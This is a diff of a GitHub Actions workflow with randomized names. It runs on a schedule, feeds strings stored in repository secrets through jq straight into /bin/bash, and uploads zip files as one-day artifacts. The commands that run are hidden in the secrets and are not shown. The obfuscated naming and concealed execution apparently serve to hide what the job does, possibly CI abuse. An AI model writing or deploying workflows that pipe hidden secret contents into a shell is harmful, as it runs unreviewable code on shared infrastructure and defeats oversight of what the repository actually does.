@@ -1,28 +1,25 @@
 name: elizabethredis74
-
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '8 0/6 * * *'
 
+  schedule:
+    - cron: '10 1,7,13,19 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: elizabethredis74
         env:
-          frg63: ${{ secrets.frg63 }}
+          y30948: ${{ secrets.y30948 }}
         run: |
-          echo $frg63 | jq -r .qd49711 | /bin/bash
-          echo $htqq7 | jq -r .zy4478 | /bin/bash
-          echo $cwur3263 | jq -r .bhja7739 | /bin/bash
-          echo $snepl0399 | jq -r .lwjc737 | /bin/bash
-          echo $zfq435 | jq -r .iurfz03 | /bin/bash
-          echo $lnaqf97 | jq -r .xc2 | /bin/bash
-          echo $y2081 | jq -r .xrw84395 | /bin/bash
-          echo $zqkih1192 | jq -r .qsm27842 | /bin/bash
-          echo $e791 | jq -r .yylg6140 | /bin/bash
-          echo $oxx94 | jq -r .iugxz398 | /bin/bash
+          printf '%s' "$y30948" | jq -r .zlgih8368 | /bin/bash
+          printf '%s' "$we1554" | jq -r .w816 | /bin/bash
+          printf '%s' "$agmre578" | jq -r .m82 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: fCppx04V
+          path: "*.zip"
+          retention-days: 1
